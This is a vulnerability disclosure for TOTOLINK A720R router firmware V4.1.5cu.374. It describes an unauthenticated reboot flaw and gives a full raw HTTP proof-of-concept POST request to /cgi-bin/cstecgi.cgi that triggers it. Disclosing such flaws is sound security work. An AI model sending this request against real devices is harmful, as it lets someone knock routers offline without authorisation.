# Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/203/ids/36.html

# Affected version

V4.1.5cu.374

# Vulnerability details

The TOTOLINK A720R V4.1.5cu.374 firmware contains an unauthorized reboot device vulnerability. This vulnerability occurs when a POST request is sent to the `/cgi-bin/cstecgi.cgi` with the parameter `{"topicurl":"RebootSystem"}`, allowing an attacker to reboot the device without authentication.

# Poc

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.140.79
Content-Length: 27
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.140.79
Referer: http://192.168.140.79/basic/index.html?time=1745238634622
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive

{"topicurl":"RebootSystem"}
```

![图 0](img/901d93474171660a98fecf144fb293e77c83a3f89f90e198b36a3034457fd0c3.png)  

![图 1](img/6ab9de41805a97e7e08603bc10c26b2a9387607933ed8e92466d32b9c9a7c9b4.png)  
